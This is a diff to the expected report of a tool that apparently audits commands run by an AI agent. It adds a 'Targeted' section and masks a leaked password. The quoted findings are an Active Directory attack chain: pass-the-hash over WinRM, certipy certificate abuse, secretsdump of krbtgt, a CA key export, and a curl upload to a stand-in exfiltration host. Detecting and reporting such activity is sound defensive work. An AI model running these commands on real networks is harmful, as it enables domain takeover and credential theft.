@@ -7,7 +7,8 @@ Summary
   indicators  22  9 Domain, 3 Email, 4 IPv4, 2 MD5, 1 SHA1, 3 URL
   activities  2
   tactics     4
-  exposed     25  Passwords and secrets 6, Usernames 7, Email addresses 2, Devices 6, IP addresses 4
+  targeted    13  Usernames 4, Email addresses 1, Hostnames 4, IP addresses 4
+  exposed     26  Passwords and secrets 7, Usernames 7, Email addresses 2, Devices 6, IP addresses 4
   intel hits  2
 
 Timeline   (step, time, role, file)
@@ -71,7 +72,7 @@ Timeline   (step, time, role, file)
 Findings
   activities
     [x] CertificateExport  1 line  CredentialAccess  T1649
-        what  nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+        what  nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
     [x] FileUpload         1 line  Exfiltration      T1048, AML.T0025
         what  curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
   indicators
@@ -125,12 +126,65 @@ Notable files   (a finding of high severity)
   [x] script  20250301_104500_step07_exfil.sh
       found   FileUpload, CertificateExport, nxc (CredentialAccess), watchlist STORM-0940
 
+Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+  Usernames (4)
+    [!] MSOL_0a1b2c3d4e5f@corp.example  prior       20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6
+        what  certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
+              certipy req -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -ca CORP-CA01 -template UserAuth -upn administrator@corp.example -target $CA_HOST -out admin_cert (20250301_103200_step05_certs.sh:6)
+    [!] administrator                   prior       20250301_104000_step06_auth.sh:3, 20250301_104000_step06_auth.sh:4, 20250301_104000_step06_auth.sh:5 and 1 more
+        what  certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
+              secretsdump.py -just-dc-user krbtgt -hashes :88********c (32 chars) corp.example/administrator@10.20.1.5 (20250301_104000_step06_auth.sh:4)
+              nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -store My" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)
+              and 1 more in the saved report
+    [!] svc_backup                      prior       20250301_101800_step02_enum.sh:4, 20250301_101800_step02_enum.sh:8, 20250301_102300_step03_adsync.sh:7
+        what  USER="${AD_USER:-svc_backup}" (20250301_101800_step02_enum.sh:4)
+              nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares | tee -a 20250301_101845_step02_enum.log (20250301_101800_step02_enum.sh:8)
+              nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
+    [i] MSOL_0a1b2c3d4e5f               discovered  20250301_103200_step05_certs.sh:3
+        from  20250301_101910_step02_users.tsv:2
+        what  MSOL_USER="MSOL_0a1b2c3d4e5f" (20250301_103200_step05_certs.sh:3)
+  Email addresses (1)
+    [!] administrator@corp.example  prior  20250301_103200_step05_certs.sh:6
+        what  certipy req -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -ca CORP-CA01 -template UserAuth -upn administrator@corp.example -target $CA_HOST -out admin_cert (20250301_103200_step05_certs.sh:6)
+  Hostnames (4)
+    [!] adfs.corp.example     prior       20250301_103200_step05_certs.sh:7
+        what  openssl req -x509 -newkey rsa:2048 -nodes -keyout rogue.key -out rogue.crt -subj "/CN=adfs.corp.example" -days 365 (20250301_103200_step05_certs.sh:7)
+    [!] corp.example          prior       20250301_101800_step02_enum.sh:3, 20250301_102300_step03_adsync.sh:8, 20250301_102700_step03_adsync_v2.sh:7 and 2 more
+        what  DOMAIN="corp.example" (20250301_101800_step02_enum.sh:3)
+              adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
+              python3 /opt/tools/adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC > "$OUTFILE" 2>&1 (20250301_102700_step03_adsync_v2.sh:7)
+              and 2 more in the saved report
+    [!] transfer.example.net  prior       20250301_104500_step07_exfil.sh:4
+        what  curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)
+    [i] ca01.corp.example     discovered  20250301_103200_step05_certs.sh:2
+        from  20250301_101530_step01_recon.txt:6
+        what  CA_HOST=ca01.corp.example (20250301_103200_step05_certs.sh:2)
+  IP addresses (4)
+    [!] 10.20.1.0/24  private  prior       20250301_101500_step01_recon.sh:3
+        what  TARGET_NET="10.20.1.0/24" (20250301_101500_step01_recon.sh:3)
+    [i] 10.20.1.17    private  discovered  20250301_101800_step02_enum.sh:6, 20250301_102300_step03_adsync.sh:3, 20250301_102700_step03_adsync_v2.sh:3
+        from  20250301_101530_step01_recon.txt:4
+        what  hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)
+              AADC=10.20.1.17 (20250301_102300_step03_adsync.sh:3)
+              AADC=10.20.1.17 (20250301_102700_step03_adsync_v2.sh:3)
+    [i] 10.20.1.23    private  discovered  20250301_101800_step02_enum.sh:6, 20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3
+        from  20250301_101530_step01_recon.txt:6
+        what  hosts=(10.20.1.5 10.20.1.17 10.20.1.23) (20250301_101800_step02_enum.sh:6)
+              nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -store My" > 20250301_104030_ca_store.txt (20250301_104000_step06_auth.sh:5)
+              nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+    [i] 10.20.1.5     private  discovered  20250301_101800_step02_enum.sh:2, 20250301_103200_step05_certs.sh:5, 20250301_104000_step06_auth.sh:3
+        from  20250301_101530_step01_recon.txt:2
+        what  DC_IP=10.20.1.5 (20250301_101800_step02_enum.sh:2)
+              certipy find -u "$MSOL_USER@corp.example" -p "$MSOL_PASS" -dc-ip 10.20.1.5 -vulnerable -stdout | tee 20250301_103240_certipy_find.txt (20250301_103200_step05_certs.sh:5)
+              certipy auth -pfx "$PFX" -dc-ip 10.20.1.5 -username administrator -domain corp.example > 20250301_104010_step06_auth.txt (20250301_104000_step06_auth.sh:3)
+
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
-  Passwords and secrets (6)
+  Passwords and secrets (7)
     [x] 88********c (32 chars)  hash of administrator@corp.example                            collected  20250301_104010_step06_auth.txt:4
     [x] Qw********9 (25 chars)  password of MSOL_0a1b2c3d4e5f                                 collected  adsync_1740824865.txt:8, 20250301_103200_step05_certs.sh:4
     [x] Zx********s (21 chars)  password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com  collected  adsync_1740824865.txt:4
     [x] 88********c (32 chars)  hash of administrator                                         used       20250301_104000_step06_auth.sh:5, 20250301_104500_step07_exfil.sh:3, 20250301_104000_step06_auth.sh:4
+    [x] Ex*****! (8 chars)      password                                                      used       20250301_104500_step07_exfil.sh:3
     [x] Qw********9 (25 chars)  password of MSOL_0a1b2c3d4e5f@corp.example                    used       20250301_103200_step05_certs.sh:5, 20250301_103200_step05_certs.sh:6
     [x] Wi********! (11 chars)  password of svc_backup                                        used       20250301_101800_step02_enum.sh:5, 20250301_101800_step02_enum.sh:8, 20250301_101845_step02_enum.log:1 and 2 more
   Usernames (7)
@@ -160,8 +214,8 @@ Exposure   (collected: first seen in an output; used: first seen in a script; a 
 Impact
   [x] Credentials exposed
       Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.
-      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
-      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Ex*****! (8 chars); password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
+      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
                nxc: nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)
                nxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
                adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
@@ -192,8 +246,8 @@ Impact
 Remediation   (most urgent first)
   [x] Rotate what was read
       Rotate every secret, key and certificate that was read, and reset the accounts of any host whose credentials were dumped.
-      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
-      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
+      targets  file ca_backup.p12; hash of administrator@corp.example; password of MSOL_0a1b2c3d4e5f; password of Sync_AADC01_0a1b2c3d4e5f@corpexample.onmicrosoft.com; hash of administrator; password Ex*****! (8 chars); password of MSOL_0a1b2c3d4e5f@corp.example; password of svc_backup
+      what     CertificateExport: nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x "certutil -exportPFX -p Ex*****! (8 chars) My $CA_THUMB ca_backup.p12" (20250301_104500_step07_exfil.sh:3)
                nxc: nxc smb "$h" -u "$USER" -p "$PASS" -d $DOMAIN --shares (20250301_101800_step02_enum.sh:8)
                nxc: nxc smb $AADC -u svc_backup -p 'Wi********! (11 chars)' -M msol > "$OUTFILE" 2>&1 (20250301_102300_step03_adsync.sh:7)
                adconnectdump.py: adconnectdump.py corp.example/svc_backup:'Wi********! (11 chars)'@$AADC >> adsync_dump.log (20250301_102300_step03_adsync.sh:8)
@@ -260,5 +314,5 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
       for  Commands generated by an AI agent
 
 [x] HIGH - 5 impacts: 3 high, 1 medium, 1 low
--> saved to <out>: report.txt, files.json, trace.json, findings.json, exposure.json, report.json
+-> saved to <out>: report.txt, files.json, trace.json, findings.json, targeted.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
